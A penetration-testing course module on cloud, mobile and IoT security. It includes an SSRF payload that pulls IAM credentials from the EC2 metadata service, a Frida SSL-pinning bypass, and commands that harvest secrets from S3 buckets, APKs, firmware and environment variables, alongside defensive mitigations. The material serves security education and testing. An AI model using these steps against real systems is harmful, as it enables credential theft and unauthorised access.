# Module 07: Cloud, Mobile, and IoT Security

> **Curriculum alignment:** CEH v13 Domain 12, 13, 17 / CompTIA PenTest+ PT0-003 — Domain 3.0 Attacks & Exploits
> **Difficulty:** Intermediate–Advanced
> **Estimated study time:** 6 hours

---

## Overview

Modern infrastructure spans cloud platforms (AWS, Azure, GCP), mobile applications (Android/iOS), and billions of IoT devices — each with distinct attack surfaces. This module covers cloud misconfiguration exploitation, Android APK analysis, iOS application testing, and IoT/firmware analysis. These environments are increasingly targeted in real-world attacks because they often lack the mature security controls found in traditional on-premises infrastructure.

---

## Table of Contents

- [Key Concepts](#key-concepts)
- [Methodology / Process](#methodology--process)
- [Tools & Commands](#tools--commands)
- [Attack Techniques (Offensive)](#attack-techniques-offensive)
- [Detection & Defence (Defensive)](#detection--defence-defensive)
- [CTF Tips & Tricks](#ctf-tips--tricks)
- [Common Mistakes](#common-mistakes)
- [Practice Labs](#practice-labs)
- [References](#references)

---

## Key Concepts

### Cloud Shared Responsibility Model

| Layer | AWS/Azure/GCP Responsibility | Customer Responsibility |
|-------|------------------------------|------------------------|
| Physical infrastructure | Provider | — |
| Hypervisor / Host OS | Provider | — |
| Network controls | Shared | Configure firewalls, SGs |
| Operating system (IaaS) | — | Patch and harden OS |
| Application | — | Secure the code |
| Data | — | Encrypt, classify, control access |
| IAM | Shared | Configure least-privilege policies |

### Common Cloud Misconfiguration Categories

| Misconfiguration | Example |
|-----------------|---------|
| Open S3 bucket | Public read/write on an S3 bucket containing customer data |
| Overly permissive IAM | Role with `AdministratorAccess` attached to an EC2 instance |
| Exposed metadata endpoint | SSRF to `169.254.169.254` leaking instance credentials |
| Unrestricted security group | `0.0.0.0/0` inbound on RDP (3389) or SSH (22) |
| Unencrypted EBS volumes | Snapshot shared publicly without encryption |

### Mobile Application Attack Surface

- **Storage:** Unencrypted SQLite databases, SharedPreferences with sensitive data
- **Network traffic:** Cleartext HTTP, certificate pinning bypass
- **Exported components:** Activities, services, broadcast receivers exposed without protection
- **Hardcoded secrets:** API keys, credentials in APK code or resources

### IoT Attack Surface

- **Default credentials:** Admin/admin, root/root on web interfaces
- **Unencrypted protocols:** Telnet, HTTP, MQTT without auth
- **Firmware vulnerabilities:** Hardcoded keys, outdated libraries in firmware
- **Physical access:** UART/JTAG debug ports exposed on PCB

---

## Methodology / Process

### Cloud Assessment
1. Enumerate the cloud environment — identify services, regions, exposed resources
2. Check S3 buckets for public access and sensitive data
3. Review IAM policies for over-privileged roles and users
4. Test for SSRF to the metadata endpoint (169.254.169.254)
5. Review security groups and network ACLs for over-permissive rules
6. Check for exposed secrets in user data, environment variables, and logs

### Mobile Assessment
1. Extract APK with `adb pull` or decompile from Play Store download
2. Decompile with `apktool` and `jadx`
3. Search for hardcoded secrets, API endpoints, and keys
4. Analyse network traffic via Burp proxy
5. Check exported Android components
6. Review local storage for sensitive data

![Cloud Attack Surface](./images/cloud-attack-surface.png)
*Figure 1: Cloud, mobile, and IoT attack surfaces*

---

## Tools & Commands

### AWS CLI — Enumeration

**Purpose:** Enumerate and interact with AWS services
**Install:** `pip install awscli` or pre-installed on Kali

```bash
# Configure with credentials
aws configure

# List S3 buckets
aws s3 ls

# Check if a bucket is publicly accessible (no auth)
aws s3 ls s3://bucket-name --no-sign-request

# Download all files from a public bucket
aws s3 cp s3://bucket-name . --recursive --no-sign-request

# Enumerate IAM permissions (who am I?)
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name current-user

# List EC2 instances
aws ec2 describe-instances --region us-east-1

# Check for open security groups (0.0.0.0/0)
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'
```

---

### ScoutSuite

**Purpose:** Multi-cloud security auditing tool
**Install:** `pip install scoutsuite`

```bash
# Audit AWS account
scout aws

# Audit Azure (requires az login first)
scout azure --cli

# Open HTML report
open scoutsuite-report/scoutsuite-results/scoutsuite_results.html
```

---

### APKTool + JADX

**Purpose:** Android APK decompilation and analysis
**Install:** `sudo apt install apktool` / download jadx from GitHub

```bash
# Decompile APK with apktool (resources + manifest)
apktool d app.apk -o app_decompiled

# Decompile with jadx (Java source code)
jadx -d app_jadx app.apk

# Check AndroidManifest.xml for exported components
cat app_decompiled/AndroidManifest.xml | grep 'android:exported="true"'

# Search for hardcoded secrets
grep -rE "(api_key|apikey|password|secret|token|key)" app_jadx/
grep -rE "(http://|https://)" app_jadx/

# Install APK on connected device/emulator
adb install app.apk

# Pull data from device storage
adb shell
# inside adb shell:
run-as com.example.app
ls files/
```

---

### Binwalk

**Purpose:** Firmware extraction and analysis
**Install:** Pre-installed on Kali Linux

```bash
# Analyse firmware structure
binwalk firmware.bin

# Extract all contents
binwalk -e firmware.bin

# Recursive extraction
binwalk --matryoshka -e firmware.bin

# Search for strings (credentials, keys)
strings firmware.bin | grep -i "password\|secret\|key\|admin"
```

---

## Attack Techniques (Offensive)

### Technique 1: SSRF to AWS Metadata Service

**Description:** Use an SSRF vulnerability in a web application to reach the EC2 instance metadata service (IMDS) and steal IAM credentials.
**Prerequisites:** SSRF vulnerability in target application running on EC2.
**MITRE ATT&CK:** [T1552.005 — Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)

```bash
# Classic SSRF payload — retrieve IAM role name
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get the temporary credentials for the role
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response contains:
# AccessKeyId, SecretAccessKey, Token (temporary credentials)

# Use credentials with AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

---

### Technique 2: Android SSL Pinning Bypass with Frida

**Description:** Bypass certificate pinning in an Android app to intercept HTTPS traffic with Burp Suite.
**Prerequisites:** Android device/emulator with root or frida-server running.
**MITRE ATT&CK:** [T1557 — Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)

```bash
# Install frida-tools
pip install frida-tools

# Push frida-server to device
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# List running apps
frida-ps -U

# Bypass SSL pinning with universal script
frida -U -f com.example.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida --no-pause
```

---

## Detection & Defence (Defensive)

### Defending Against Cloud Misconfigurations

**Detection indicators:**
- AWS CloudTrail logs showing `GetObject` requests from unexpected IPs on S3
- GuardDuty alerts on unusual API activity (credential use from new geography)
- Config rules reporting buckets with public access enabled

**Mitigations:**
- Enable S3 Block Public Access at the account level
- Use AWS Config rules to continuously audit security group rules
- Enforce MFA for IAM console and root account
- Enable IMDSv2 (requires session token for metadata access — prevents SSRF exploitation)
- Rotate access keys every 90 days; use IAM roles instead of long-lived keys

### Defending Mobile Applications

**Mitigations:**
- Use Android Keystore and iOS Keychain for sensitive credential storage
- Implement certificate pinning (note: can be bypassed — use as defence-in-depth)
- Mark exported components only where intentional; add permission requirements
- Enable ProGuard/R8 obfuscation to increase reverse engineering difficulty

**CIS Controls:** CIS Control 4 (Secure Configuration of Enterprise Assets), CIS Control 3 (Data Protection)

---

## CTF Tips & Tricks

- **S3 bucket hunting:** Search `site:s3.amazonaws.com company-name` in Google — misconfigured buckets are indexed.
- **Cloud CTF:** Check environment variables first — `printenv | grep -i aws` or `env` on a compromised EC2.
- **APK CTFs:** `strings app.apk | grep flag` — hardcoded flags appear in CTF apps.
- **IoT CTFs:** Default credentials list: admin/admin, root/root, admin/password — try all on any web interface.
- **Firmware CTFs:** Use `binwalk -e` and look in `/etc/passwd`, `/etc/shadow`, and any `.conf` files.

---

## Common Mistakes

| Mistake | Why it matters | Correct approach |
|---------|---------------|-----------------|
| Only testing one cloud region | Resources may be deployed globally | Enumerate all regions: `aws ec2 describe-regions` |
| Static analysis only for mobile | Dynamic behaviour differs at runtime | Always combine static analysis with runtime traffic interception |
| Not checking environment variables on EC2 | Apps often store AWS keys as env vars | Check `/proc/1/environ` or application config files |
| Skipping firmware analysis | IoT devices contain hardcoded credentials and old libraries | Always extract and analyse firmware when available |

---

## Practice Labs

| Platform | Lab / Room Name | Difficulty | Link |
|----------|----------------|------------|------|
| TryHackMe | Cloud Security | Medium | [Link](https://tryhackme.com/room/cloudsecurity) |
| TryHackMe | Android Hacking 101 | Easy | [Link](https://tryhackme.com/room/androidhacking101) |
| HackTheBox | Cloud Machines | Various | [Link](https://www.hackthebox.com) |
| CloudGoat | AWS vulnerable lab | Medium | [Link](https://github.com/RhinoSecurityLabs/cloudgoat) |

---

## References

- [HackTricks Cloud](https://cloud.hacktricks.xyz/) — Cloud pentesting techniques
- [OWASP Mobile Security Testing Guide](https://mas.owasp.org/MASTG/) — Mobile app testing standard
- [OWASP IoT Attack Surface Areas](https://owasp.org/www-project-internet-of-things/)
- [CloudGoat — Rhino Security Labs](https://github.com/RhinoSecurityLabs/cloudgoat) — Vulnerable AWS environment
- CEH v13 Official Courseware — Module 12, 13, 17
- CompTIA PenTest+ PT0-003 Study Guide — Chapter 7

---

*Back to [Repository Root](../)*
